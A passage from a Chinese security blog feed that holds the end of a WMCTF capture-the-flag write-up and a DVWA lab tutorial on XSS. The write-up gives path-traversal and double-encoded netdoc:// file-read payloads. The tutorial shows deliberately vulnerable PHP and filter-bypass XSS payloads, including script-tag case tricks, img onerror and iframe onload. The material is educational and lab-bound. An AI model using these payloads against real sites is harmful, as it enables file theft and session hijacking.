dearnold(img):</span><br><span class="hljs-comment">#     r,c,t = img.shape</span><br><span class="hljs-comment">#     p = np.zeros((r,c,t),dtype=np.uint8)</span><br><span class="hljs-comment">#     for a in range(1, 11):</span><br><span class="hljs-comment">#         for b in range(1, 11):</span><br><span class="hljs-comment">#             for i in range(r):</span><br><span class="hljs-comment">#                 for j in range(c):</span><br><span class="hljs-comment">#                     for k in range(t):</span><br><span class="hljs-comment">#                         x = ((a*b+1)*i - b*j)%r</span><br><span class="hljs-comment">#                         y = (-a*i + j)%r</span><br><span class="hljs-comment">#                         p[x,y,k] = img[i,j,k]</span><br><span class="hljs-comment">#             filename = f&#x27;./dearnold&#123;a&#125;_&#123;b&#125;.jpg&#x27;</span><br><span class="hljs-comment">#             cv2.imwrite(filename, p)</span><br><span class="hljs-comment">#             print(&#x27;dearnold&#123;&#125;_&#123;&#125;&#x27;.format(a, b))</span><br><span class="hljs-comment">#     return p</span><br><span class="hljs-comment"># #dearnold(im)</span><br><span class="hljs-comment"># ##直接看图片dearnold5_5为正常图片=&gt;得到a=5, b=5</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">video_dearnold</span>(<span class="hljs-params">img</span>):<br>    r,c,t = img.shape<br>    p = np.zeros((r,c,t),dtype=np.uint8)<br>    a = <span class="hljs-number">5</span><br>    b = <span class="hljs-number">5</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r):<br>        <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(c):<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(t):<br>                x = ((a*b+<span class="hljs-number">1</span>)*i - b*j)%r<br>                y = (-a*i + j)%r<br>                p[x,y,k] = img[i,j,k]<br>    <span class="hljs-keyword">return</span> p<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">video</span>(<span class="hljs-params">input_video,output_video</span>):<br>    <span class="hljs-comment">#打开视频</span><br>    cap = cv2.VideoCapture(input_video)<br>    <span class="hljs-comment">#获取宽、高、帧率</span><br>    width = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_WIDTH))<br>    height = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))<br>    fps = <span class="hljs-built_in">int</span>(cap.get(cv2.CAP_PROP_FPS))<br>    <span class="hljs-comment"># 设置输出视频的编码器和参数</span><br>    fourcc = cv2.VideoWriter_fourcc(*<span class="hljs-string">&#x27;mp4v&#x27;</span>)<br>    out = cv2.VideoWriter(output_video, fourcc, fps, (width, height), isColor=<span class="hljs-literal">True</span>)<br><br>    <span class="hljs-keyword">while</span> cap.isOpened():<br>        ret, frame = cap.read()<br>        <span class="hljs-keyword">if</span> ret:<br>            frame = video_dearnold(frame)``<br>            out.write(frame)<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">break</span><br>    cap.release()<br>    out.release()<br><br>video(<span class="hljs-string">&#x27;final.mkv&#x27;</span>,<span class="hljs-string">&#x27;new.mp4&#x27;</span>)<br></code></pre></td></tr></table></figure><p>wp说后半段flag在视频中，但是确实看不清</p><p><img src="/img/2023WMCTF/17006206917709.png" alt="img" /><imgsrc="/img/2023WMCTF/170062069177010.png" alt="img" /></p><p>hint直接放出<code>_I_CAN_GOT_both&#125;</code></p><figure><img src="/img/2023WMCTF/170062069177011.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><figure><img src="/img/2023WMCTF/170062069177012.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>dct水印</p><p>原理可以参考 https://weipp7.gitee.io/posts/e1e00902.html</p><p>我这里找了很久找不到原音频（不知道怎么从bilibili弄原音频https://www.bilibili.com/video/BV1Fh4y1M79t/?spm_id_from=333.337.search-card.all.click），贴个输出频谱图的脚本吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> scipy.io <span class="hljs-keyword">import</span> wavfile<br><span class="hljs-keyword">from</span> scipy.fftpack <span class="hljs-keyword">import</span> dct, idct, fft, fftfreq, ifft<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> matplotlib.mlab <span class="hljs-keyword">import</span> window_none<br>rate, data = wavfile.read(<span class="hljs-string">&#x27;origin.wav&#x27;</span>)<br>rate2, data2 = wavfile.read(<span class="hljs-string">&#x27;final.wav&#x27;</span>)<br>data3 = data2 - data<br><span class="hljs-comment">#输出data3的频谱图</span><br>n_samples = data3.shape[<span class="hljs-number">0</span>]<br>fft_size = <span class="hljs-number">4096</span><br>plt.specgram(data3 , fft_size, rate, window=window_none,noverlap=<span class="hljs-number">10</span>, scale=<span class="hljs-string">&#x27;dB&#x27;</span>)<br>plt.show()<br></code></pre></td></tr></table></figure><h2 id="web"><strong>WEB</strong></h2><h3 id="anyfileread"><strong>AnyFileRead</strong></h3><p>参考：https://zhuanlan.zhihu.com/p/640655127</p><figure><img src="/img/2023WMCTF/170062069177113.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>SpringSecurityConfig：</p><figure><img src="/img/2023WMCTF/170062069177114.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><p>payload：<code>/admin/../flag</code></p><p>借用别人的图：</p><figure><img src="/img/2023WMCTF/170062069177115.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h3 id="ez_java_agagin"><strong>ez_java_agagin</strong></h3><p>环境关了没下附件，绕过java和flag字符串，用file/netdoc +url二次编码绕过</p><p>payload：<code>/Imagefile?url1=netdoc://java/..//%25%36%36%25%36%63%25%36%31%25%36%37</code></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
      <category>web</category>
      
      <category>misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>misc</tag>
      
      <tag>wp</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS漏洞</title>
    <link href="/2023/01/01/XSS%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/01/01/XSS%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="xss">XSS</h1><p>XSS，跨站脚本，Cross-site scripting。XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</p><h2 id="漏洞成因">漏洞成因</h2><p>当用户的输入或者一些用户可控参数未经处理地输出到页面上，就容易产生XSS漏洞。</p><h2 id="类型">类型</h2><p>XSS大致可分为反射、存储、DOM三种类型。</p><ol type="1"><li>反射型：攻击代码在URL里，输出在HTTP响应中</li><li>存储型：攻击代码在数据库里，输出在HTTP响应中</li><li>DOM型：攻击代码在URL里，输出在DOM节点中。</li></ol><h2 id="整体攻击思路">整体攻击思路</h2><p>角色定义：用户、攻击者、正常服务器、恶意服务器</p><ol type="1"><li>攻击者发送带有XSS的恶意URL给用户</li><li>用户点击URL，访问正常服务器</li><li>正常服务器返回了对XSS脚本的响应</li><li>在用户不知情的情况下，用户浏览器执行了返回的XSS脚本，发送会话给恶意服务器</li><li>攻击者从恶意服务器中接受的请求中获取了会话信息(Cookie等)</li><li>攻击者使用用户的身份，登录到正常服务器，相当于劫持了用户会话</li></ol><figure><img src="/img/XSS漏洞/16998361139181.png" alt="img" /><figcaption aria-hidden="true">img</figcaption></figure><h2 id="dvwa靶场xss练习">DVWA靶场xss练习</h2><h3 id="反射型">反射型</h3><h4 id="low">low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&#x27;&lt;pre&gt;Hello &#x27;</span> . <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>没有任何过滤</p><p>payload：</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="medium">medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>&lt;script&gt;</code>过滤1次。</p><p>payload：</p><p><code>&lt;scr&lt;script&gt;ipt&gt;alert(/xss/)&lt;/script&gt;</code><code>&lt;ScRiPt&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="high">high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">header</span> (<span class="hljs-string">&quot;X-XSS-Protection: 0&quot;</span>);<br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>匹配<code>&lt;</code>、<code>s</code>、<code>c</code>、<code>r</code>、<code>i</code>、<code>p</code>、<code>t</code>、<code>&gt;</code>字符</p><p>payload：</p><p><code>&lt;img src=x onerror=alert(1)&gt;</code><code>&lt;iframe onload=alert(1)&gt;</code></p><h4 id="impossible">impossible</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">// Is there any input?</span><br><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">array_key_exists</span>( <span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-variable">$_GET</span> ) &amp;&amp; <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] != <span class="hljs-literal">NULL</span> ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;name&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-variable">$html</span> .= <span class="hljs-string">&quot;&lt;pre&gt;Hello <span class="hljs-subst">&#123;$name&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>htmlspecialchars()</code>转义特殊字符（默认不转义<code>'</code>，但是这里是转义的了）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&amp;----&amp;amp;<br>&quot;-----&amp;quot;<br>&#x27;------&amp;apos;<br>&lt;-----&amp;lt<br>&gt;-----&amp;gt;<br></code></pre></td></tr></table></figure><p>转义后无法解析为html元素，无法xss</p><h3 id="存储型">存储型</h3><p>存储型跟反射型的利用基本一致。但是存储型的XSS会存在数据库，弹窗会一直存在</p><h4 id="low-1">low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>trim</code>过滤预定义字符(<code>\t</code>、<code>\n</code>等)，<code>mysqli_real_escape_string</code>过滤<code>'</code>、<code>"</code>、<code>\x00</code>、<code>\n</code>等</p><p>但没怎么过滤xss语句直接插入数据库中</p><p>payload：</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="medium-1">medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对<code>$message</code>做了<code>htmlspecialchars()</code>限制，但是对<code>$name</code>未作过多的限制，只使用了<code>str_replace()</code>过滤字符<code>&lt;script&gt;</code></p><p>payload：</p><p><code>&lt;ScRiPt&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="high-1">high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  